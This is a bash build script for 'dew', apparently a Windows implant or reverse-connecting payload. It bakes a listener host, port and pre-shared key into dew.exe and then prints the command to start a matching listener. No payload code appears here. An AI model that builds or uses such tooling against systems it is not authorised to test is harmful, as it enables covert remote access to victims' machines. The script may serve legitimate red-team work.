#!/bin/bash
# build.sh — one-command build for dew
# Usage: ./build.sh <LHOST> <LPORT> [KEY]

set -e

if [ $# -lt 2 ]; then
    echo "Usage: ./build.sh <LHOST> <LPORT> [KEY]"
    echo "  LHOST  Listener IP or domain"
    echo "  LPORT  Listener port"
    echo "  KEY    64-char hex PSK (auto-generated if omitted)"
    exit 1
fi

LHOST="$1"
LPORT="$2"
KEY="${3:-$(python3 -c "import secrets; print(secrets.token_hex(32))")}"

echo "[*] Building dew.exe"
echo "    LHOST = $LHOST"
echo "    LPORT = $LPORT"
echo "    KEY   = ${KEY:0:8}...${KEY: -8}"

make clean
make LHOST="$LHOST" LPORT="$LPORT" KEY="$KEY"

SIZE=$(stat --format=%s dew.exe 2>/dev/null || stat -f%z dew.exe 2>/dev/null)
echo ""
echo "[+] Built dew.exe (${SIZE} bytes)"
echo ""
echo "[*] Start listener:"
echo "    python listener.py --lport $LPORT --key $KEY"
